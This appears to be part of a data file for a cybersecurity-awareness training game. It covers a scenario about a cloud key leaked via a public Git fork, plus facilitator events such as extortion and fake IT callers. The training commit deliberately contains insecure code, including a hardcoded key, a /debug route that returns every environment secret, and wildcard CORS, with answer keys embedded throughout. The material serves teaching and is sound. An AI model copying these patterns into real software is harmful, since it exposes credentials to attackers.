      "debrief": "Backdoor account removed and the key rotated. Shipping on time nearly cost you production."
    }
  },
  {
    "id": "repo",
    "track": "dev",
    "title": "The Leaky Repo",
    "company": "Arcadia Pay",
    "threat": "Secrets in Git, public forks, cloud key abuse",
    "lede": "Saturday, 11:40 AM. A billing alert fires: ₹3.8 lakh spent in two hours on cloud servers nobody launched.",
    "locks": [
      {
        "type": "spot",
        "frame": "code",
        "name": "The commit",
        "fileName": "Commit 9f3c2a · “quick fix for demo”",
        "task": "This commit went out on Friday evening. Tap the 4 lines that caused trouble.",
        "items": [
          {
            "id": "imp",
            "html": "  import express from \"express\";"
          },
          {
            "id": "env",
            "html": "- const CLOUD_KEY = process.env.CLOUD_KEY;"
          },
          {
            "id": "key",
            "html": "+ const CLOUD_KEY = \"AKIA6X••••••••W2PL\"; // TODO move to env",
            "flag": true,
            "note": "A live cloud key written into code. Anyone who can see the repo can use it."
          },
          {
            "id": "json",
            "html": "  app.use(express.json());"
          },
          {
            "id": "dbg",
            "html": "+ app.get(\"/debug\", (req, res) => res.json(process.env));",
            "flag": true,
            "note": "A debug page that shows every secret in the server’s environment to anyone who asks."
          },
          {
            "id": "cors",
            "html": "+ app.use(cors({ origin: \"*\" }));",
            "flag": true,
            "note": "Any website can now call this payout API from a victim’s browser."
          },
          {
            "id": "fork",
            "html": "+ # pushed to personal fork github.com/rohan-dev/arcadia-payouts (public)",
            "flag": true,
            "note": "Company code in a public personal fork. Bots scan public GitHub for keys around the clock."
          },
          {
            "id": "lst",
            "html": "  app.listen(8080);"
          }
        ],
        "hint": "Look for secrets, things that expose secrets, things that trust everyone, and where the code went.",
        "debrief": "The key went public on Friday at 6:02 PM. How long before someone used it?"
      },
      {
        "type": "code",
        "name": "The cloud trail",
        "mask": "##:##",
        "answer": "1816",
        "task": "Here are Friday’s events. Enter the time the attacker first used the key.",
        "cols": [
          "When",
          "Source",
          "Event"
        ],
        "rows": [
          [
            "Fri 18:02",
            "GitHub",
            "Commit 9f3c2a pushed to the public fork",
            "bad"
          ],
          [
            "Fri 18:09",
            "GitHub",
            "Repo cloned by an unknown account",
            "bad"
          ],
          [
            "Fri 18:16",
            "Cloud audit log",
            "ListInstances called with the key from 185.220.x.x",
            "bad"
          ],
          [
            "Fri 18:21",
            "Cloud audit log",
            "32 GPU servers started in 4 regions",
            "bad"
          ],
          [
            "Sat 11:40",
            "Billing",
            "Spend alert: ₹3.8 lakh",
            "ok"
          ]
        ],
        "hint": "Cloning the repo isn’t using the key. Look for the first call made with it.",
        "debrief": "14 minutes from push to abuse. Automated bots find leaked keys faster than anyone notices the mistake."
      },
      {
        "type": "spot",
        "frame": "code",
        "name": "The debug page",
        "fileName": "GET /debug · public response",
        "task": "The new /debug endpoint returned the server’s environment to anyone who asked. Tap the 4 values that must now be rotated.",
        "items": [
          {
            "id": "env",
            "html": "&quot;NODE_ENV&quot;: &quot;production&quot;,"
          },
          {
            "id": "port",
            "html": "&quot;PORT&quot;: &quot;8080&quot;,"
          },
          {
            "id": "db",
            "html": "&quot;DATABASE_URL&quot;: &quot;postgres://payouts:Arc•••••25@db.internal:5432/payouts&quot;,",
            "flag": true,
            "note": "Contains the payouts database password."
          },
          {
            "id": "sign",
            "html": "&quot;PAYOUT_SIGNING_KEY&quot;: &quot;psk_live_9f2c••••••••a71e&quot;,",
            "flag": true,
            "note": "Signs payout requests. With it, an attacker could send money."
          },
          {
            "id": "lvl",
            "html": "&quot;LOG_LEVEL&quot;: &quot;info&quot;,"
          },
          {
            "id": "jwt",
            "html": "&quot;JWT_SECRET&quot;: &quot;c8d1••••••••••7b30&quot;,",
            "flag": true,
            "note": "Lets anyone forge sessions and sign in as any user."
          },
          {
            "id": "smtp",
            "html": "&quot;SMTP_PASSWORD&quot;: &quot;Mail••••2025&quot;,",
            "flag": true,
            "note": "Lets attackers send email as Arcadia Pay."
          },
          {
            "id": "app",
            "html": "&quot;APP_NAME&quot;: &quot;arcadia-payouts&quot;"
          }
        ],
        "hint": "Rotate anything that would let someone sign in, sign requests, or pretend to be you.",
        "debrief": "Everything in the environment is now public, so all four secrets need rotating today. Debug endpoints never belong in code that ships."
      },
      {
        "type": "pick",
        "name": "The guard rails",
        "task": "Pick the 3 controls that would have stopped this.",
        "items": [
          {
            "id": "push",
            "text": "Secret scanning with push protection on every repository",
            "bad": true,
            "why": "Blocks the commit before the key ever leaves the laptop."
          },
          {
            "id": "pw",
            "text": "Longer passwords for GitHub accounts",
            "why": "Helpful, but it doesn’t stop a key being committed."
          },
          {
            "id": "vault",
            "text": "Secrets kept in a vault and injected at runtime, never in code",
            "bad": true
          },
          {
            "id": "ren",
            "text": "Renaming the repository"
          },
          {
            "id": "fork",
            "text": "Blocking forks of company repositories to personal accounts",
            "bad": true
          },
          {
            "id": "care",
            "text": "Asking developers to be more careful"
          }
        ],
        "hint": "Choose the controls that work even when someone is in a hurry.",
        "debrief": "Good controls make the safe path the easy path. Push protection and a vault would have made this commit impossible."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "Put the response in order.",
        "steps": [
          {
            "id": "rev",
            "text": "Revoke the key and shut down the attacker’s servers."
          },
          {
            "id": "logs",
            "text": "Check the cloud audit logs for everything the key did."
          },
          {
            "id": "purge",
            "text": "Remove the secret from Git history and the fork, and rotate related secrets."
          },
          {
            "id": "ctrl",
            "text": "Turn on push protection and vault-based secrets for every repository."
          }
        ],
        "shown": [
          "purge",
          "ctrl",
          "rev",
          "logs"
        ],
        "hint": "Stop the bleeding first. Then find out what it touched.",
        "debrief": "Revoking the key stops the bill growing. The audit log tells you whether the attacker went beyond mining."
      },
      {
        "type": "choice",
        "name": "The personal fork",
        "task": "Rohan explains: “I pushed to my own GitHub so I could work over the weekend.” What should he have done?",
        "options": [
          {
            "id": "priv",
            "text": "Used a private personal repository instead of a public one.",
            "why": "Private or not, a personal account is outside company control, and it stays with him if he leaves."
          },
          {
            "id": "co",
            "text": "Worked in the company repository, from his company laptop, over the VPN.",
            "right": true,
            "why": "Company code stays on company accounts and devices, with access the company controls."
          },
          {
            "id": "zip",
            "text": "Zipped the code and emailed it to his personal address.",
            "why": "The code, and any secrets in it, now sit in a personal mailbox."
          },
          {
            "id": "usb",
            "text": "Copied the repository to a pen drive to take home.",
            "why": "Pen drives get lost, and nothing on them is logged or protected."
          }
        ],
        "hint": "Where does company code stay under company control?",
        "debrief": "Company code lives in company repositories, on company accounts and devices. That way access can be reviewed, protected and removed."
      }
    ],
    "lessons": [
      "Never put keys in code, not even “just for the demo”.",
      "Company code stays in company repositories. No public personal forks.",
      "A leaked key is used within minutes. Revoke it; deleting the commit isn’t enough.",
      "Push protection and a secrets vault make the safe path the easy one.",
      "Debug endpoints and environment dumps never ship. Anything they exposed must be rotated."
    ],
    "decision": {
      "type": "decision",
      "name": "The quick fix",
      "prompt": "The developer says: “I’ll just delete the key in a new commit. Problem solved.” What do you do?",
      "options": [
        {
          "id": "rev",
          "text": "Revoke the key right now, then clean the history and tell Security.",
          "q": "best",
          "note": "Revoking makes the leaked copy useless, wherever it ended up."
        },
        {
          "id": "priv",
          "text": "Make the repo private now and revoke the key on Monday.",
          "q": "ok",
          "pen": 60,
          "note": "Bots already copied it. Every hour the key stays valid, the bill grows. +60 seconds."
        },
        {
          "id": "del",
          "text": "Delete the key in a new commit. That fixes it.",
          "q": "poor",
          "note": "The key is still in history and in every copy that was cloned. It still works."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "Still out there",
      "task": "The new commit removed the key from the latest code, but it still works. Pick the 2 places it can still be found.",
      "items": [
        {
          "id": "hist",
          "text": "The Git history of the public fork",
          "bad": true
        },
        {
          "id": "bin",
          "text": "The developer’s recycle bin"
        },
        {
          "id": "clones",
          "text": "Copies already cloned by bots and mirror sites",
          "bad": true
        },
        {
          "id": "jira",
          "text": "The team’s task board"
        }
      ],
      "hint": "Git remembers everything, and the internet keeps copies.",
      "debrief": "Once a secret is public, the only fix is to make it worthless: revoke it."
    }
  }
];

/** Surprise events the facilitator can send to any team mid-game. */
export const INJECTS: Inject[] = [
  {
    "id": "media",
    "name": "A journalist calls",
    "prompt": "A journalist calls asking you to confirm the incident.",
    "options": [
      {
        "id": "a",
        "text": "Say you can’t comment, and pass the call to Corporate Communications.",
        "q": "best",
        "note": "Only authorised spokespeople talk to the media."
      },
      {
        "id": "b",
        "text": "Hang up without saying anything.",
        "q": "ok",
        "pen": 30,
        "note": "No leak, but Comms should know a journalist is asking. +30 seconds."
      },
      {
        "id": "c",
        "text": "Confirm what you know, off the record.",
        "q": "poor",
        "pen": 90,
        "note": "There is no off the record. That becomes the headline. +90 seconds."
      }
    ]
  },
  {
    "id": "hush",
    "name": "Keep it quiet",
    "prompt": "A senior manager asks you to keep the incident quiet until month-end.",
    "options": [
      {
        "id": "a",
        "text": "Explain it has to be reported now under policy and regulatory timelines, and escalate to the CISO.",
        "q": "best",
        "note": "Reporting timelines, such as CERT-In’s 6 hours, don’t wait for month-end."
      },
      {
        "id": "b",
        "text": "Agree, but write it down in case you need it later.",
        "q": "ok",
        "pen": 60,
        "note": "Writing it down doesn’t make delaying it acceptable. +60 seconds."
      },
      {
        "id": "c",
        "text": "Agree. Month-end numbers matter more.",
        "q": "poor",
        "pen": 90,
        "note": "Hiding an incident turns a breach into a compliance failure. +90 seconds."
      }
    ]
  },
  {
    "id": "extort",
    "name": "The attacker writes",
    "prompt": "The attacker emails you: “Pay 5 BTC or we publish the data.”",
    "options": [
      {
        "id": "a",
        "text": "Don’t reply. Forward it to Security as evidence.",
        "q": "best",
        "note": "Evidence kept, and the attacker gets nothing."
      },
      {
        "id": "b",
        "text": "Delete the email.",
        "q": "ok",
        "pen": 30,
        "note": "You’ve lost evidence Security needed. +30 seconds."
      },
      {
        "id": "c",
        "text": "Reply asking for proof that they have the data.",
        "q": "poor",
        "pen": 90,
        "note": "Engaging tells them you’re worried and willing to talk. +90 seconds."
      }
    ]
  },
  {
    "id": "whatsapp",
    "name": "The WhatsApp post",
    "prompt": "A colleague posts screenshots of the incident in a staff WhatsApp group.",
    "options": [
      {
        "id": "a",
        "text": "Ask them to delete it, and report it to Security.",
        "q": "best",
        "note": "It stops the spread and Security knows."
      },
      {
        "id": "b",
        "text": "Ignore it. Not your business.",
        "q": "ok",
        "pen": 30,
        "note": "The screenshots keep spreading. +30 seconds."
      },
      {
        "id": "c",
        "text": "Forward it to friends to warn them.",
        "q": "poor",
        "pen": 90,
        "note": "You’ve just leaked confidential incident details. +90 seconds."
      }
    ]
  },
  {
    "id": "fakeit",
    "name": "The helpful caller",
    "prompt": "Someone claiming to be from IT calls, offering to “fix it” if you install a remote-access app.",
    "options": [
      {
        "id": "a",
        "text": "Hang up and call the IT helpdesk on the number you know.",
        "q": "best",
        "note": "Attackers love a crisis. Verify on a channel you start."
      },
      {
        "id": "b",
        "text": "Ask for their employee ID first.",
        "q": "ok",
        "pen": 30,
        "note": "IDs are easy to invent. Call back on a known number. +30 seconds."
      },
      {
        "id": "c",
        "text": "Install the app so they can help.",
        "q": "poor",
        "pen": 90,
        "note": "You’ve just given an attacker remote control. +90 seconds."
      }
    ]
  },
  {
    "id": "client",
    "name": "The bank client asks",
    "prompt": "One of your bank clients asks for an update on the incident.",
    "options": [
      {
        "id": "a",
        "text": "Route it to the incident lead, who shares confirmed facts through the agreed channel.",
        "q": "best",
        "note": "One voice, confirmed facts, the agreed route."
      },
      {
        "id": "b",
        "text": "Say you’ll get back to them.",
        "q": "ok",
        "pen": 30,
        "note": "Fine, but tell the incident lead straight away. +30 seconds."
      },
      {
        "id": "c",
        "text": "Email them the raw logs yourself.",
        "q": "poor",
        "pen": 90,
        "note": "Raw logs can hold other clients’ data and unconfirmed guesses. +90 seconds."
      }
    ]
  }
];
